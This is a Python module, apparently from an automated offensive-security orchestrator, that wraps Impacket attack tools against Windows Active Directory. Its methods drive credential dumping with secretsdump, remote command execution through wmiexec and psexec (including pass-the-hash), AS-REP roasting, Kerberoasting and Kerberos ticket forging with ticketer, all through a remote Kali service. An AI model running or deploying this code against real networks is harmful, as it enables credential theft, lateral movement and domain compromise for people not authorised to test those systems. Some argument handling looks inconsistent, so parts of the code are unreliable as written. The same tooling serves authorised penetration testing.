import os, json, logging, shlex
from typing import Optional
from orchestrator.kali_tools_client import kali

logger = logging.getLogger("ad_toolkit")


class ADToolkit:
    def __init__(self):
        self._impacket_prefix = ["python3", "-m"]
        self._checked = False
        self._available = False

    @property
    def has_impacket(self) -> bool:
        if not self._checked:
            import httpx
            from orchestrator.kali_tools_client import KALI_TOOLS_URL
            try:
                resp = httpx.get(f"{KALI_TOOLS_URL}/health", timeout=3)
                self._available = resp.status_code == 200
            except Exception:
                self._available = False
            self._checked = True
        return self._available

    async def _run_impacket(self, script: str, args: list[str],
                            proxy_env: Optional[dict] = None,
                            timeout: int = 120) -> dict:
        arg_str = " ".join(f"'{a}'" if " " in a else a for a in args)
        result = await kali.run_impacket(script, arg_str, timeout=timeout)
        return {
            "success": result.get("returncode") == 0 and "error" not in result,
            "stdout": result.get("stdout", "")[:5000],
            "stderr": result.get("stderr", "")[:2000],
            "returncode": result.get("returncode", -1),
        }

    async def secretsdump(self, target: str, username: str = "", domain: str = "",
                          hash: str = "", use_kcc: bool = False,
                          proxy_env: Optional[dict] = None) -> dict:
        args = []
        if use_kcc:
            args.append("-k")
        if domain:
            args.append(domain)
        auth = f"{domain}\\{username}" if domain and username else username
        if hash:
            auth = f"{auth}:{hash}" if auth else hash
            args.append(f"{auth}@{target}")
        elif username:
            args.append(f"{auth}@{target}")
        else:
            args.append(f"-system")
            args.append(target)
        return await self._run_impacket("secretsdump", args, proxy_env=proxy_env)

    async def wmiexec(self, target: str, username: str, domain: str = "",
                      password: str = "", hash: str = "",
                      proxy_env: Optional[dict] = None) -> dict:
        args = []
        auth = f"{domain}\\{username}" if domain else username
        if hash:
            args.append(f"-hashes")
            args.append(hash)
        args.append(f"{shlex.quote(auth)}:{shlex.quote(password)}@{shlex.quote(target)}" if password else f"{shlex.quote(auth)}@{shlex.quote(target)}")
        return await self._run_impacket("wmiexec", args, proxy_env=proxy_env)

    async def psexec(self, target: str, username: str, domain: str = "",
                     password: str = "", hash: str = "",
                     proxy_env: Optional[dict] = None) -> dict:
        args = []
        auth = f"{domain}\\{username}" if domain else username
        if hash:
            args.append(f"-hashes")
            args.append(hash)
        args.append(f"{shlex.quote(auth)}:{shlex.quote(password)}@{shlex.quote(target)}" if password else f"{shlex.quote(auth)}@{shlex.quote(target)}")
        return await self._run_impacket("psexec", args, proxy_env=proxy_env)

    async def get_np_users(self, target: str, domain: str = "",
                           username: str = "", proxy_env: Optional[dict] = None) -> dict:
        args = [f"{domain}/" if domain else ""]
        if username:
            args[0] += username
        args[0] += f" -dc-ip {target}"
        return await self._run_impacket("GetNPUsers", args, proxy_env=proxy_env)

    async def get_user_spns(self, target: str, domain: str = "",
                            username: str = "", password: str = "",
                            proxy_env: Optional[dict] = None) -> dict:
        args = [f"{shlex.quote(domain)}/{shlex.quote(username)}:{shlex.quote(password)}" if domain and username and password else shlex.quote(target)]
        return await self._run_impacket("GetUserSPNs", args, proxy_env=proxy_env)

    async def ticketer(self, target: str, domain: str, user: str,
                       nt_hash: str = "", aes_key: str = "",
                       proxy_env: Optional[dict] = None) -> dict:
        args = ["-nthash", nt_hash, "-domain", domain, "-user", user, "-dc-ip", target]
        if aes_key:
            args.extend(["-aes", aes_key])
        return await self._run_impacket("ticketer", args, proxy_env=proxy_env)


def get_ad_toolkit() -> ADToolkit:
    return ADToolkit()
